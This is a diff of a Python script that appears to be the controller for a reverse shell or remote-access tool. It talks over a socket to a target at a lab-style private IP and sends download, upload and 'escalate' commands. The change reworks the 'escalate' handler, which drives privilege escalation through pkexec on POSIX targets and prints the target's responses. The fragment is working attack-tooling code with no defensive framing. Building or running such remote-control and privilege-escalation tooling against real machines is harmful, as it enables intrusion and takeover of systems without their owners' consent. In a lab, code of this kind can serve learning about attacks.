@@ -6,6 +6,7 @@
 import socket
 import json
 import os
+import time
 
 target_ip = "192.168.56.1"
 target_port = 5021
@@ -54,18 +55,22 @@ def target_communication():
             download_file(command[9:])
         elif command[:6] == 'upload':
             upload_file(command[7:])
-        elif command[:8] == "escalate":
+        elif command[:8] == "escalate": # Run by `escalate {username}`
             user = command[9:]
-            print(f"Escalating privileges of {user} with pkexec...")
-            result = reliable_recv()
-            print(result)
-            while True:
-                check = reliable_recv()
-                print(check)
-                if check == "DONE":
-                    break
-            result2 = reliable_recv()
-            print(f"{result2}")
+            print(f"Escalating privileges of USER:{user} with pkexec...")
+            osname = reliable_recv()
+            print(f"This is OS NAME:{osname}")
+            if osname == 'posix':
+                print("Starting Escalation")
+                while True:
+                    check = reliable_recv()
+                    print(check)
+                    if check == "DONE":
+                        break
+                result = reliable_recv()
+                print(result)
+            else:
+                print("Can't escalate B/C not posix system")
         elif command == "sudo su -l":
             print(command)
         else:
